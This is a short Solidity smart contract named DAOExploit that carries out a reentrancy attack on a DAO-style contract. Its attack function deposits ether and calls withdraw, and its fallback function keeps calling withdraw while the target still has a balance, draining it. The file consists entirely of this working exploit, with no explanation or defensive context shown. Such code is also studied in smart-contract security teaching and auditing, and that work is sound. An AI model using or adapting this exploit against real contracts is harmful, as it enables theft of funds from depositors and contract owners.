pragma solidity ^0.8.10;

interface IDAO {

    function withdraw() external;
    function deposit() external payable;

}

contract DAOExploit {

    IDAO dao;

    constructor (address _dao) {

        dao = IDAO(_dao);

    }

    function attack() public payable {

        require(msg.value >= 1);
        dao.deposit{value: msg.value}();

        dao.withdraw();

    }

    fallback() external payable {

        if (address(dao).balance >= 1) {

            dao.withdraw();

        }

    }

}